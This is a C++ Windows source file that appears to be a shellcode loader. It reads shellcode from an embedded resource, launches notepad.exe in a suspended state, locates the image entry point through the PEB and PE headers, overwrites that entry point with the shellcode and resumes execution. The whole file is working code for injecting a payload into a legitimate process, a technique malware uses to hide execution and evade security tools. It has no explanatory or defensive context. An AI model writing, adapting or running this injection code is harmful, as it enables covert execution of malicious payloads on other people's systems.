#include"..\public.hpp"
#include <winternl.h>
#pragma comment(lib, "ntdll")

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.Execute shellcode
	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
#ifdef _M_X64
	DWORD returnLength = 0;
	CreateProcessA(0, (LPSTR)"c:\\windows\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	LONGLONG imageBaseOffset = (LONGLONG)pbi.PebBaseAddress + 16;
	// get target process image base address
	LPVOID imageBase = 0;
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, 8, NULL);
	// read target process image headers
	BYTE headersBuffer[4096] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (LONGLONG)imageBase);
#else
	DWORD returnLength = 0;
	CreateProcessA(0, (LPSTR)"c:\\windows\\system32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD imageBaseOffset = (DWORD)pbi.PebBaseAddress + 8;
	// get target process image base address
	LPVOID imageBase = 0;
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, 4, NULL);
	// read target process image headers
	BYTE headersBuffer[4096] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase);
#endif // x64
	// write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, codeEntry, shellcode, shellcodeSize, NULL);
	ResumeThread(pi.hThread);
	return 0;
}